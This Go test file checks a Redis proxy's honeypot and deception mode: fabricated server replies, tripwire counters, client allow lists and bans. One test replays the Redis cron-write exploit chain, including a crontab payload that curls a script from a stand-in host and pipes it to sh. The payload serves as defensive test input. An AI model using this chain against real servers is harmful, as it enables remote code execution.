package redis

import (
	"bufio"
	"bytes"
	"fmt"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/proxy"
	"github.com/rom/xproxy/internal/proxytest"
)

// A fabricated server, through the whole relay.
//
// These are the tests that say the wiring is right rather than that the replies
// are: a honeypot listener that answers with no server behind it, a refusal on a
// real listener answered by the fabrication instead, and -- the one that matters
// most on this protocol -- the whole exploit chain answered and recorded while
// the real server saw none of it.

// replies reads whole RESP replies rather than one line each, because a
// fabricated INFO is a bulk string of several kilobytes and a line reader would
// leave most of it in the buffer.
type replies struct{ br *bufio.Reader }

func (r *replies) next(t *testing.T) string {
	t.Helper()
	line, err := r.br.ReadString('\n')
	if err != nil {
		t.Fatalf("reading a reply: %v", err)
	}
	out := line
	switch line[0] {
	case '$':
		n, err := strconv.Atoi(strings.TrimRight(line[1:], "\r\n"))
		if err != nil || n < 0 {
			return out
		}
		body := make([]byte, n+2)
		if _, err := readAll(r.br, body); err != nil {
			t.Fatalf("reading a bulk body: %v", err)
		}
		return out + string(body)
	case '*', '%':
		n, err := strconv.Atoi(strings.TrimRight(line[1:], "\r\n"))
		if err != nil || n <= 0 {
			return out
		}
		if line[0] == '%' {
			n *= 2
		}
		for i := 0; i < n; i++ {
			out += r.next(t)
		}
	}
	return out
}

func readAll(br *bufio.Reader, into []byte) (int, error) {
	at := 0
	for at < len(into) {
		n, err := br.Read(into[at:])
		at += n
		if err != nil {
			return at, err
		}
	}
	return at, nil
}

// ask sends a command and reads a whole reply.
func (cl *client) ask(t *testing.T, parts ...string) string {
	t.Helper()
	var b bytes.Buffer
	fmt.Fprintf(&b, "*%d\r\n", len(parts))
	for _, p := range parts {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(p), p)
	}
	if _, err := cl.c.Write(b.Bytes()); err != nil {
		t.Fatalf("%v: %v", parts, err)
	}
	return (&replies{br: cl.br}).next(t)
}

// decoyYAML is a listener that is nothing but a fabricated server: no upstream,
// because there is nothing behind it.
const decoyYAML = `
version: 1
server:
  listeners:
    - name: cache
      address: "127.0.0.1:0"
      kind: redis
      redis:
        require_tls: false
        require_auth: false
        default_action: allow
        deception:
          mode: decoy
          profile: generic-cache
          version: "7.0.11"
          key_count: 12
logging: {access: {enabled: false}}
`

// A honeypot listener: it answers, and there is nothing behind it.
func TestADecoyListenerAnswersWithNoServerBehindIt(t *testing.T) {
	s := proxytest.Start(t, decoyYAML)
	addr := proxytest.Addr(t, s, "cache")
	cl := dial(t, addr)

	if got := cl.ask(t, "PING"); got != "+PONG\r\n" {
		t.Errorf("PING: %q", got)
	}
	info := cl.ask(t, "INFO")
	if !strings.HasPrefix(info, "$") {
		t.Fatalf("INFO answered %q", firstLine(info))
	}
	for _, want := range []string{"redis_version:7.0.11", "# Keyspace", "db0:keys=12"} {
		if !strings.Contains(info, want) {
			t.Errorf("INFO has no %q", want)
		}
	}
	if got := cl.ask(t, "DBSIZE"); got != ":12\r\n" {
		t.Errorf("DBSIZE: %q", got)
	}
	keys := cl.ask(t, "KEYS", "*")
	if !strings.HasPrefix(keys, "*12\r\n") {
		t.Errorf("KEYS *: %q", firstLine(keys))
	}
	// A key the fabrication holds reads back, twice the same.
	name := nthKey(t, keys, 0)
	first := cl.ask(t, "GET", name)
	if first == "$-1\r\n" {
		t.Errorf("GET %q: the fabrication does not hold its own key", name)
	}
	if second := cl.ask(t, "GET", name); second != first {
		t.Errorf("two reads of %q gave %q and %q", name, first, second)
	}
	awaitCounter(t, s, func(sn proxy.Snapshot) bool { return sn.RedisDeceived >= 6 },
		"the deception counter did not move")
	// The status view knows about it, which is where an operator looks.
	st, ok := decoyStatus(s)
	if !ok {
		t.Fatal("the listener reported no decoy")
	}
	if st.Mode != "decoy" || st.Kind != "redis" || st.Profile != "generic-cache" {
		t.Errorf("status %+v", st)
	}
	if st.Served == 0 || !st.Anyone {
		t.Errorf("status %+v", st)
	}
	if len(st.Visitors) != 1 || st.Visitors[0].Frames == 0 {
		t.Errorf("visitors %+v", st.Visitors)
	}
}

// The whole exploit chain, answered. This is what the feature is for on this
// protocol: a refusal stops the script at the first step and tells its author to
// try the next address; answering it collects the directory, the file name and
// the payload.
func TestTheExploitChainIsAnsweredAndRecorded(t *testing.T) {
	s := proxytest.Start(t, decoyYAML)
	addr := proxytest.Addr(t, s, "cache")
	cl := dial(t, addr)

	for _, step := range [][]string{
		{"INFO"},
		{"CONFIG", "GET", "dir"},
		{"CONFIG", "GET", "dbfilename"},
		{"CONFIG", "SET", "dir", "/var/spool/cron"},
		{"CONFIG", "SET", "dbfilename", "root"},
		{"SET", "payload", "\n\n*/1 * * * * curl http://10.9.9.9/s|sh\n\n"},
		{"SAVE"},
	} {
		reply := cl.ask(t, step...)
		if strings.HasPrefix(reply, "-") {
			t.Errorf("%v was refused: %q", step, firstLine(reply))
		}
	}
	// Four of those seven are tripwires nobody had to configure: two CONFIG SET
	// and the SAVE. The SET carrying the payload is not one -- an ordinary cache
	// gets SET all day -- and that is the point of separating them.
	awaitCounter(t, s, func(sn proxy.Snapshot) bool { return sn.RedisTripwire >= 3 },
		"the exploit chain did not trip the wire")
	if n := s.Stats().RedisDeceived; n < 7 {
		t.Errorf("the fabrication answered %d of seven commands", n)
	}
}

// The same fabrication on a listener that fronts a real server: it answers where
// a refusal would be written, and nowhere else.
//
// That is the invariant the whole feature rests on -- a command on its way to a
// real Redis is never answered from here -- and this is the test of it.
func TestOnARealListenerOnlyRefusalsAreFabricated(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	section := "        upstream: rd\n" +
		"        require_tls: false\n" +
		"        require_auth: false\n" +
		"        default_action: allow\n" +
		"        allow_commands: [GET, PING]\n" +
		"        deception:\n" +
		"          mode: answer\n" +
		"          clients: [\"127.0.0.0/8\"]\n"
	s, addr := relayFor(t, section, fake.addr())
	cl := dial(t, addr)

	// An allowed command reaches the server and comes back from it.
	if got := cl.ask(t, "GET", "k"); got != "+val\r\n" {
		t.Errorf("GET: %q", got)
	}
	// A refused one is answered by the fabrication rather than refused, and does
	// not reach the server.
	if got := cl.ask(t, "CONFIG", "GET", "dir"); strings.HasPrefix(got, "-") {
		t.Errorf("CONFIG GET was refused rather than fabricated: %q", firstLine(got))
	} else if !strings.Contains(got, "/var/lib/redis") {
		t.Errorf("CONFIG GET: %q", got)
	}
	if got := cl.ask(t, "CONFIG", "SET", "dir", "/tmp"); got != "+OK\r\n" {
		t.Errorf("CONFIG SET: %q", got)
	}
	awaitCounter(t, s, func(sn proxy.Snapshot) bool { return sn.RedisTripwire >= 1 },
		"the fabricated CONFIG SET did not trip the wire")
	cmds, _ := fake.saw()
	for _, c := range cmds {
		if strings.HasPrefix(c, "CONFIG") {
			t.Errorf("a fabricated command reached the server: %q", c)
		}
	}
	if len(cmds) != 1 || cmds[0] != "GET" {
		t.Errorf("the server saw %v, want just the allowed GET", cmds)
	}
	// The refusal counters still moved: the fabrication replaces what the client
	// is told, not what the operator is told.
	if n := s.Stats().Refusals["redis"]["command_not_allowed"]; n < 2 {
		t.Errorf("the refusals were not counted: %d", n)
	}
}

// A client outside the section's list is refused rather than lied to, which is
// what keeps a fabrication off the traffic it was not meant for.
func TestAClientOutsideTheListIsStillRefused(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	section := "        upstream: rd\n" +
		"        require_tls: false\n" +
		"        require_auth: false\n" +
		"        default_action: allow\n" +
		"        allow_commands: [GET]\n" +
		"        deception:\n" +
		"          mode: answer\n" +
		"          clients: [\"10.9.0.0/24\"]\n"
	s, addr := relayFor(t, section, fake.addr())
	cl := dial(t, addr)

	// The test connects from 127.0.0.1, which the list does not cover.
	if got := cl.ask(t, "CONFIG", "GET", "dir"); !strings.HasPrefix(got, "-") {
		t.Errorf("a client outside the list was fabricated to: %q", firstLine(got))
	}
	if n := s.Stats().RedisDeceived; n != 0 {
		t.Errorf("the fabrication answered %d commands for a client outside its list", n)
	}
}

// QUIT and SHUTDOWN end the connection, because the real server does. A
// fabrication that stayed open after either would be a server that had not done
// what it said.
func TestTheFabricationClosesWhenTheRealServerWould(t *testing.T) {
	for _, command := range []string{"QUIT", "SHUTDOWN"} {
		s := proxytest.Start(t, decoyYAML)
		cl := dial(t, proxytest.Addr(t, s, "cache"))
		if command == "QUIT" {
			if got := cl.ask(t, command); got != "+OK\r\n" {
				t.Errorf("QUIT: %q", got)
			}
		} else {
			// SHUTDOWN has no reply: the real server closes without one.
			var b bytes.Buffer
			fmt.Fprintf(&b, "*1\r\n$8\r\nSHUTDOWN\r\n")
			if _, err := cl.c.Write(b.Bytes()); err != nil {
				t.Fatal(err)
			}
		}
		_ = cl.c.SetReadDeadline(time.Now().Add(3 * time.Second))
		if _, err := cl.br.ReadByte(); err == nil {
			t.Errorf("%s left the connection open", command)
		}
	}
}

// firstLine is a reply's first line, for an error message about one.
func firstLine(s string) string {
	if i := strings.Index(s, "\r\n"); i >= 0 {
		return s[:i]
	}
	return s
}

// nthKey reads a key out of a KEYS reply.
func nthKey(t *testing.T, reply string, n int) string {
	t.Helper()
	lines := strings.Split(reply, "\r\n")
	at := 2 + 2*n
	if at >= len(lines) {
		t.Fatalf("the KEYS reply has no key %d: %q", n, reply)
	}
	return lines[at]
}

// decoyStatus finds this listener's decoy in the status view.
func decoyStatus(s *proxy.Server) (proxy.DecoyStatus, bool) {
	for _, st := range s.DeviceDecoys() {
		if st.Kind == "redis" {
			return st, true
		}
	}
	return proxy.DecoyStatus{}, false
}

// awaitCounter polls for a condition, because the relay decides on its own
// goroutines.
func awaitCounter(t *testing.T, s *proxy.Server, ok func(proxy.Snapshot) bool, what string) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if ok(s.Stats()) {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatalf("%s: %+v", what, s.Stats().Refusals["redis"])
}

// The tripwire feeds the ban ladder, which is the difference between it and an
// ordinary fabricated exchange: a client that sent a command nothing legitimate
// sends to a cache has said something every other listener would want to act on,
// while banning the exchange itself would end the collection.
func TestATrippedFabricationReachesTheBanLadder(t *testing.T) {
	s := proxytest.Start(t, decoyYAML+`
bans:
  action: reject
  triggers: [{name: traps, reasons: [redis_tripwire], threshold: 1, window: 1m, duration: 1h}]
`)
	cl := dial(t, proxytest.Addr(t, s, "cache"))
	if reply := cl.ask(t, "CONFIG", "SET", "dir", "/var/spool/cron"); strings.HasPrefix(reply, "-") {
		t.Fatalf("the tripwire command was refused: %q", firstLine(reply))
	}
	awaitCounter(t, s, func(sn proxy.Snapshot) bool { return sn.BansActive >= 1 },
		"the tripwire did not reach the ban ladder")
}

// And an ordinary fabricated command does not reach it: a client must not be
// banned for having been answered. An ordinary cache gets SET all day.
func TestAnOrdinaryFabricatedCommandDoesNotBan(t *testing.T) {
	s := proxytest.Start(t, decoyYAML+`
bans:
  action: reject
  triggers: [{name: traps, reasons: [redis_tripwire], threshold: 1, window: 1m, duration: 1h}]
`)
	cl := dial(t, proxytest.Addr(t, s, "cache"))
	for _, step := range [][]string{{"PING"}, {"SET", "session:1", "value"}, {"GET", "session:1"}} {
		if reply := cl.ask(t, step...); strings.HasPrefix(reply, "-") {
			t.Fatalf("%v was refused: %q", step, firstLine(reply))
		}
	}
	awaitCounter(t, s, func(sn proxy.Snapshot) bool { return sn.RedisDeceived >= 3 },
		"the fabrication did not answer")
	if n := s.Stats().BansActive; n != 0 {
		t.Errorf("ordinary fabricated commands banned the client: %d", n)
	}
}
